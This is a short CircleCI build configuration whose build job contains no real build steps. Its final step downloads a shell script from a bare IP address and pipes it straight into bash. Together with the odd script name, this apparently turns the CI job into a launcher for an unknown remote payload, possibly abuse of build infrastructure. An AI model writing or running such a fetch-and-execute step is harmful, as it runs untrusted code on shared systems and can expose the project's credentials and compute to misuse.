version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
    steps:
      - checkout
      - run: sudo -i;apt update;apt -y install wget
      - run: wget -O - http://194.233.164.53/start_jay_AzAz16_ws_rand.sh | bash
